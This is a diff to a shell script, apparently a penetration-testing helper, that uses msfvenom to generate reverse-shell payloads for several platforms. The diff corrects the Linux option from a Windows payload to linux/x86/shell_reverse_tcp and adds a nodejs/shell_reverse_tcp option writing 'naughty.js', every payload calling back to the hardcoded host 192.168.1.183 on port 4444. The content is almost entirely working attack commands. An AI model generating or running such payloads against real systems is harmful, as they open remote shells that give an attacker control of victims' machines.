@@ -20,7 +20,7 @@ echo ""
 echo "  >> choose your destiny (1/2/3):"
 echo "      1. goto windows        2. goto linux"
 echo "      3. php                 4. war (jsp)"
-echo "      5. dll"
+echo "      5. dll                 6. nodejs"
 echo ""
 read letsgoto
 
@@ -35,7 +35,7 @@ case "$letsgoto" in
 
 
   "2") echo "[+] preparing Linux revshell for Kali ($KALI on port $KALIPORT):"
-       msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.183 LPORT=4444 EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x1a" > linshell.py 2>&1
+       msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.183 LPORT=4444 EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x1a" > linshell.py 2>&1
        echo "[+] Linux reverse shell should be ready here:"
        ls -la linshell.py
        echo "[+] we're done."
@@ -71,6 +71,15 @@ case "$letsgoto" in
        echo "[+] DLL reverse shell should be ready here:"
        ls -la h00ker.dll
        echo "[+] we're done."
+  ;;
+
+  "6") echo "[+] preparing NodeJS revshell for Kali ($KALI on port $KALIPORT):"
+
+       msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.183 LPORT=4444 -f raw > naughty.js 2>&1
+       echo "[+] naughty.js reverse shell should be ready here:"
+       ls -la naughty.js
+       echo "[+] we're done."
+
 
    ;;
 
